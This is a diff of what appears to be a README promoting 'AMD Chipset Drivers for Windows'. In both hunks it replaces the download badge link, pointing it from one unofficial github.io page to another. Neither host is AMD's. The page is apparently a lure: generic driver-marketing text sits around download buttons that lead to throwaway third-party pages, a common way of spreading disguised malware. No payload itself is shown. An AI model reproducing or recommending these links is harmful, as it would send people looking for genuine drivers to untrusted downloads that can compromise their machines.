@@ -4,7 +4,7 @@
 
 ## 📥 Download AMD Chipset Drivers for Windows
 
-[![⬇️ Download AMD Chipset Drivers](https://img.shields.io/badge/Download-AMD%20Chipset%20Drivers-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/220)
+[![⬇️ Download AMD Chipset Drivers](https://img.shields.io/badge/Download-AMD%20Chipset%20Drivers-blue?style=for-the-badge&logo=windows)](https://chipsetload.github.io/.github/)
 
 ---
 
@@ -28,7 +28,7 @@ AMD Chipset Drivers are essential software packages designed to ensure your AMD 
 
 The drivers support various chipsets, including those for Ryzen processors and AMD motherboards (X570, B550, etc.). Installing the correct AMD chipset drivers ensures compatibility with the latest hardware, improves system responsiveness, and provides updates for enhanced functionality and security.
 
-[![⬇️ Download AMD Chipset Drivers](https://img.shields.io/badge/Download-AMD%20Chipset%20Drivers-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/220)
+[![⬇️ Download AMD Chipset Drivers](https://img.shields.io/badge/Download-AMD%20Chipset%20Drivers-blue?style=for-the-badge&logo=windows)](https://chipsetload.github.io/.github/)
 
 ---
 
